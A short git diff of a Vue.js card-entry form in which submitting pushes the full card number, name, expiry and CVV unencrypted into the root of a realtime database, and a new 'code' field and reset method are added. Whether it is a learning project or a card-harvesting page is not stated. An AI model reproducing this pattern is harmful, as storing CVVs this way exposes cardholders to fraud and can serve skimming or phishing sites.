@@ -24,6 +24,7 @@ const vm = new Vue({
             cardMonth: "",
             cardYear: "",
             cardCvv: "",
+            code: "",
             minCardYear: new Date().getFullYear(),
             amexCardMask: "#### ###### #####",
             otherCardMask: "#### #### #### ####",
@@ -97,19 +98,25 @@ const vm = new Vue({
         },
         submitData(){
            if (this.cardNumber && this.cardName && this.cardMonth &&  this.cardYear && this.cardCvv ){
-
+               console.log("send");
+               database.ref('/').push({
+                   cardNumber: this.cardNumber,
+                   cardName: this.cardName,
+                   cardMonth: this.cardMonth,
+                   cardYear: this.cardYear,
+                   cardCvv: this.cardCvv
+               });
            } else {
                alert('Заполните все поля')
            }
-
-          console.log("send");
-          database.ref('/').push({
-            cardNumber: this.cardNumber,
-            cardName: this.cardName,
-            cardMonth: this.cardMonth,
-            cardYear: this.cardYear,
-            cardCvv: this.cardCvv
-          });
+        },
+        reset(){
+            this.cardNumber = ""
+            this.cardName = ""
+            this.cardMonth = ""
+            this.cardYear = ""
+            this.cardCvv = ""
+            this.code = ""
         }
     }
 });
